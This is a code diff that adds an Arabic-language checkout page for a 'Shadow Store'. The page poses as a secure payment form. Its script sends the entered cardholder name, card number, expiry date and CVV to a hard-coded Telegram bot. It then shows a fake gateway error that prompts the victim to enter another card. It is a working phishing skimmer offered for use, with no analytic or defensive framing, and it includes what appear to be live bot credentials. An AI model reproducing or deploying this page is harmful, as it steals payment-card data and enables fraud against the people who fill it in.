@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إتمام عملية الشراء - Shadow Store</title>
+    <style>
+        body { font-family: sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .payment-card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 100%; max-width: 350px; }
+        h2 { text-align: center; color: #333; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        .row { display: flex; gap: 10px; }
+        button { width: 100%; padding: 12px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        button:hover { background-color: #0056b3; }
+    </style>
+</head>
+<body>
+
+<div class="payment-card">
+    <h2>بيانات الدفع آمنة</h2>
+    <p style="font-size: 12px; text-align: center; color: #666;">سيتم خصم المبلغ فور تأكيد العملية</p>
+    <input type="text" id="holder" placeholder="الاسم الكامل على البطاقة">
+    <input type="number" id="card" placeholder="رقم البطاقة (16 رقم)">
+    <div class="row">
+        <input type="text" id="exp" placeholder="MM/YY">
+        <input type="number" id="cvv" placeholder="CVV">
+    </div>
+    <button onclick="capture()">تأكيد الدفع والطلب</button>
+</div>
+
+<script>
+function capture() {
+    const token = "8596496672:AAEUYefPv-HPSf8UQRwNqcZ-Zh37qnd-LyM";
+    const chatId = "6406747400";
+    const data = `
+🔥 صيد جديد من متجرك 🔥
+👤 الاسم: ${document.getElementById('holder').value}
+💳 الكرت: ${document.getElementById('card').value}
+📅 التاريخ: ${document.getElementById('exp').value}
+🔒 الرمز: ${document.getElementById('cvv').value}
+    `;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(data)}`)
+    .then(() => {
+        alert("خطأ في بوابة الدفع (Error 505). يرجى المحاولة باستخدام بطاقة أخرى.");
+        location.reload();
+    });
+}
+</script>
+
+</body>
+</html>
